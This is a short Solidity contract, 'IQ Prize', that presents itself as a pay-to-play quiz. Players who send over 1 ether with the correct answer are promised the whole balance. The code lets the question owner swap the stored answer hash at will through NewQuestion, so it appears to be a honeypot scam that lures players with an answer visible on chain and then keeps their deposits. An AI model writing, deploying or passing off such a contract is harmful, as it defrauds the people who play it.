1 /*
2 IQ Prize
3 
4 The one who has the intellect will take the prize in our game. Reading books expands the mind
5 
6 https://www.iqtest-certification.com
7 
8 
9 $$$$$$\  $$$$$$\        $$$$$$$\            $$\                     
10 \_$$  _|$$  __$$\       $$  __$$\           \__|                    
11   $$ |  $$ /  $$ |      $$ |  $$ | $$$$$$\  $$\ $$$$$$$$\  $$$$$$\  
12   $$ |  $$ |  $$ |      $$$$$$$  |$$  __$$\ $$ |\____$$  |$$  __$$\ 
13   $$ |  $$ |  $$ |      $$  ____/ $$ |  \__|$$ |  $$$$ _/ $$$$$$$$ |
14   $$ |  $$ $$\$$ |      $$ |      $$ |      $$ | $$  _/   $$   ____|
15 $$$$$$\ \$$$$$$ /       $$ |      $$ |      $$ |$$$$$$$$\ \$$$$$$$\ 
16 \______| \___$$$\       \__|      \__|      \__|\________| \_______|
17              \___|
18 */
19 pragma solidity ^0.4.20;
20 
21 contract IQ_Prize
22 {
23     function Try(string _response) external payable {
24         require(msg.sender == tx.origin);
25         
26         if(responseHash == keccak256(_response) && msg.value>1 ether)
27         {
28             msg.sender.transfer(this.balance);
29         }
30     }
31     
32     string public question;
33     
34     address questionSender;
35     
36     bytes32 responseHash;
37  
38     function start_qz_game(string _question,string _response) public payable {
39         if(responseHash==0x0) 
40         {
41             responseHash = keccak256(_response);
42             question = _question;
43             questionSender = msg.sender;
44         }
45     }
46     
47  /*   function StopGame() public payable onlyQuestionSender {
48        selfdestruct(msg.sender);
49     }
50  */   
51     function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
52         question = _question;
53         responseHash = _responseHash;
54     }
55     
56     function newQuestioner(address newAddress) public onlyQuestionSender {
57         questionSender = newAddress;
58     }
59     
60     modifier onlyQuestionSender(){
61         require(msg.sender==questionSender);
62         _;
63     }
64 
65     
66     function() public payable{}
67 }